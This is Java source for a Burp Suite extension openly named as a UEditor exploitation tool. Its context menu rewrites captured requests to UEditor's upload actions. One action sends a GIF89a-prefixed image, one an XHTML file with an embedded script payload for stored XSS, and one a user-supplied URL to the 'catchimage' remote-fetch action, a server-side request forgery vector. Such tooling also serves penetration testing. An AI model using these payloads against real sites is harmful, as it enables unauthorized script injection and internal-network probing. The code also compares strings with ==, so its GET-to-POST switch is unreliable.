package burp;

import javax.swing.*;
import javax.swing.text.Utilities;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

public class BurpExtender implements IBurpExtender,IContextMenuFactory {
    public static IExtensionHelpers helpers;
    public PrintWriter stdout;
    private final String Plugin_Name = "Ueditor 利用工具";

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.registerContextMenuFactory(this);
        // 设置插件名
        callbacks.setExtensionName(this.Plugin_Name);

    }

    public List<JMenuItem> createMenuItems(final IContextMenuInvocation iContextMenuInvocation){
        // 上下文菜单
        List<JMenuItem> menus = new ArrayList<>();
        JMenu menu = new JMenu(this.Plugin_Name);
        JMenuItem uploadImg = new JMenuItem("上传图片");
        JMenuItem uploadFile = new JMenuItem("上传XML");
        JMenuItem catchimage = new JMenuItem("远程抓取");
        menu.add(uploadImg);
        menu.add(uploadFile);
        menu.add(catchimage);
        menus.add(menu);

        uploadImg.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0){
                getAction(iContextMenuInvocation,"uploadimage","upfile","GIF89a");
            }
        });

        uploadFile.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0){
                getAction(iContextMenuInvocation,"uploadfile","upfile","<html><head></head><body>something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script></body></html>");
            }
        });

        catchimage.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0){
                String url = JOptionPane.showInputDialog("远程抓取地址:");
                getAction(iContextMenuInvocation,"catchimage","source[]",url);

            }
        });

        return menus;
    }



    private static void getAction(IContextMenuInvocation iContextMenuInvocation, String action, String s, String url){

        IHttpRequestResponse currentRequest = iContextMenuInvocation.getSelectedMessages()[0];

        IParameter newPara = helpers.buildParameter("action", action, IParameter.PARAM_BODY);


        byte[] new_Request = currentRequest.getRequest();
        new_Request = helpers.updateParameter(new_Request, newPara);

        currentRequest.setRequest(new_Request);


        IParameter newPara2 = helpers.buildParameter(s, url, IParameter.PARAM_BODY);
        byte[] new_Request2 = currentRequest.getRequest();
        new_Request2 = helpers.updateParameter(new_Request2, newPara2);

        // 如果是 GET 请求就自动转成 POST 请求
        IRequestInfo iRequestInfo = helpers.analyzeRequest(currentRequest);
        if (iRequestInfo.getMethod() == "GET"){
            new_Request2 = helpers.toggleRequestMethod(new_Request2);
        }

        currentRequest.setRequest(new_Request2);
    }

}